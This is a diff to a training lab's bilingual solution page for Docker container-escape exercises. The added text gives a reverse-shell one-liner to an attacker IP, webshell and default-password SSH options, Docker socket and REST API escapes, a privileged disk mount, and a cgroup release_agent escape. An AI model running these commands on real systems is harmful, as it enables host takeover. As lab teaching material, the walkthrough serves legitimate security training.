@@ -88,21 +88,56 @@
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
+    <h3>Prerequisito — Obtener shell en el contenedor desde Kali</h3>
+    <p>HackLabs corre dentro de un contenedor Docker. Antes de explotar el escape necesitas una shell dentro del contenedor:</p>
+    <pre># Opción A — Reverse shell via lab CMDI (recomendada)
+# 1. En Kali, escucha conexiones:
+nc -lvnp 4444
+
+# 2. En el lab CMDI (/cmdi), inyecta el payload en el formulario:
+#    Comando de prueba: id
+#    Reverse shell: bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
+
+# Opción B — Shell via webshell (lab File Upload)
+# Sube un webshell PHP/Python y accede desde el navegador.
+
+# Opción C — SSH bruteforce al host (lab Bruteforce)
+ssh admin@TARGET_IP    # contraseña: password1</pre>
+
     <h3>Easy — Docker Socket Escape</h3>
     <p>El socket de Docker está montado dentro del contenedor. Cualquier proceso con acceso al socket puede lanzar contenedores privilegiados en el host.</p>
     <ol>
-      <li>Verifica que el socket existe:
-        <pre>ls -la /var/run/docker.sock</pre>
+      <li>Verifica que estás en un contenedor:
+        <pre>cat /proc/1/cgroup | grep -i docker
+# Si ves "/docker/..." → estás dentro de un contenedor</pre>
       </li>
-      <li>Monta el filesystem del host en un nuevo contenedor y haz chroot:
+      <li>Verifica que el socket existe y está accesible:
+        <pre>ls -la /var/run/docker.sock
+# srw-rw---- ... docker → socket disponible</pre>
+      </li>
+      <li>Comprueba si el binario docker está disponible:
+        <pre>which docker
+# Si no está, usa la API REST via curl (ver paso alternativo)</pre>
+      </li>
+      <li>Escapa montando el filesystem del host en un nuevo contenedor:
         <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
       </li>
-      <li>O lee directamente archivos sensibles del host:
-        <pre>docker run --rm -v /:/mnt alpine chroot /mnt sh -c "cat /etc/shadow"</pre>
+      <li>Alternativa sin binario docker (API REST):
+        <pre># Lista imágenes disponibles:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool
+
+# Crea un contenedor privilegiado con el host montado:
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
+  http://localhost/containers/create?name=escape
+
+# Inicia el contenedor y recoge los logs:
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
+curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
       </li>
       <li>Desde dentro del chroot tienes acceso completo al host. Lee la flag:
-        <pre>cat /root/root.txt
-# Flag dedicada del lab: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
+        <pre>cat /root/root.txt</pre>
       </li>
     </ol>
 
@@ -116,14 +151,14 @@
       <li>Lista los discos del host y monta el disco principal:
         <pre>fdisk -l
 mkdir /tmp/hostdisk
-mount /dev/sda1 /tmp/hostdisk</pre>
+mount /dev/sda1 /tmp/hostdisk
+# Si falla sda1, prueba con sda, vda, xvda...</pre>
       </li>
       <li>Haz chroot al disco del host para obtener una shell con acceso completo:
         <pre>chroot /tmp/hostdisk</pre>
       </li>
       <li>Lee la flag:
-        <pre>cat /root/root.txt
-# Flag dedicada del lab: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
+        <pre>cat /root/root.txt</pre>
       </li>
     </ol>
 
@@ -138,38 +173,73 @@ echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
       </li>
       <li>Crea el script que se ejecutará en el host:
         <pre>echo '#!/bin/sh' &gt; /cmd
-echo "id &gt; ${host_path}/output" &gt;&gt; /cmd
+echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
 chmod a+x /cmd</pre>
       </li>
       <li>Dispara la ejecución añadiendo un proceso al cgroup y matándolo:
         <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+sleep 1
 cat /output</pre>
       </li>
-      <li>Adapta el script para leer la flag o lanzar una reverse shell:
-        <pre>echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
-# Flag dedicada del lab: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
+      <li>La flag aparecerá en <code>/output</code>:
+        <pre>cat /output</pre>
       </li>
     </ol>
 
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">curl (API Docker)</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Prerequisite — Get a shell inside the container from Kali</h3>
+    <p>HackLabs runs inside a Docker container. Before exploiting the escape you need a shell inside the container:</p>
+    <pre># Option A — Reverse shell via CMDI lab (recommended)
+# 1. On Kali, listen for connections:
+nc -lvnp 4444
+
+# 2. In the CMDI lab (/cmdi), inject the payload in the form:
+#    Test command: id
+#    Reverse shell: bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
+
+# Option B — Shell via webshell (File Upload lab)
+# Upload a PHP/Python webshell and access it from the browser.
+
+# Option C — SSH bruteforce to the host (Bruteforce lab)
+ssh admin@TARGET_IP    # password: password1</pre>
+
     <h3>Easy — Docker Socket Escape</h3>
     <p>The Docker socket is mounted inside the container. Any process with socket access can launch privileged containers on the host.</p>
     <ol>
-      <li>Verify the socket exists:
-        <pre>ls -la /var/run/docker.sock</pre>
+      <li>Verify you are inside a container:
+        <pre>cat /proc/1/cgroup | grep -i docker
+# If you see "/docker/..." → you are inside a container</pre>
       </li>
-      <li>Mount the host filesystem into a new container and chroot:
+      <li>Verify the socket exists and is accessible:
+        <pre>ls -la /var/run/docker.sock
+# srw-rw---- ... docker → socket available</pre>
+      </li>
+      <li>Check if the docker binary is available:
+        <pre>which docker
+# If not available, use the REST API via curl (see alternative step)</pre>
+      </li>
+      <li>Escape by mounting the host filesystem into a new container:
         <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
       </li>
-      <li>Or read sensitive host files directly:
-        <pre>docker run --rm -v /:/mnt alpine chroot /mnt sh -c "cat /etc/shadow"</pre>
+      <li>Alternative without docker binary (REST API):
+        <pre># List available images:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool
+
+# Create a privileged container with host mounted:
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
+  http://localhost/containers/create?name=escape
+
+# Start the container and collect logs:
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
+curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
       </li>
       <li>Inside the chroot you have full host access. Read the flag:
-        <pre>cat /root/root.txt
-# Dedicated lab flag: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
+        <pre>cat /root/root.txt</pre>
       </li>
     </ol>
 
@@ -183,14 +253,14 @@ cat /output</pre>
       <li>List host disks and mount the main disk:
         <pre>fdisk -l
 mkdir /tmp/hostdisk
-mount /dev/sda1 /tmp/hostdisk</pre>
+mount /dev/sda1 /tmp/hostdisk
+# If sda1 fails, try sda, vda, xvda...</pre>
       </li>
       <li>Chroot into the host disk to get a shell with full access:
         <pre>chroot /tmp/hostdisk</pre>
       </li>
       <li>Read the flag:
-        <pre>cat /root/root.txt
-# Dedicated lab flag: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
+        <pre>cat /root/root.txt</pre>
       </li>
     </ol>
 
@@ -205,21 +275,21 @@ echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
       </li>
       <li>Create the script that will run on the host:
         <pre>echo '#!/bin/sh' &gt; /cmd
-echo "id &gt; ${host_path}/output" &gt;&gt; /cmd
+echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
 chmod a+x /cmd</pre>
       </li>
       <li>Trigger execution by adding a process to the cgroup and killing it:
         <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+sleep 1
 cat /output</pre>
       </li>
-      <li>Adapt the script to read the flag or launch a reverse shell:
-        <pre>echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
-# Dedicated lab flag: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
+      <li>The flag will appear in <code>/output</code>:
+        <pre>cat /output</pre>
       </li>
     </ol>
 
     <h3>Tools</h3>
-    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">curl (Docker API)</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
   </div>
 </div>
 {% endblock %}
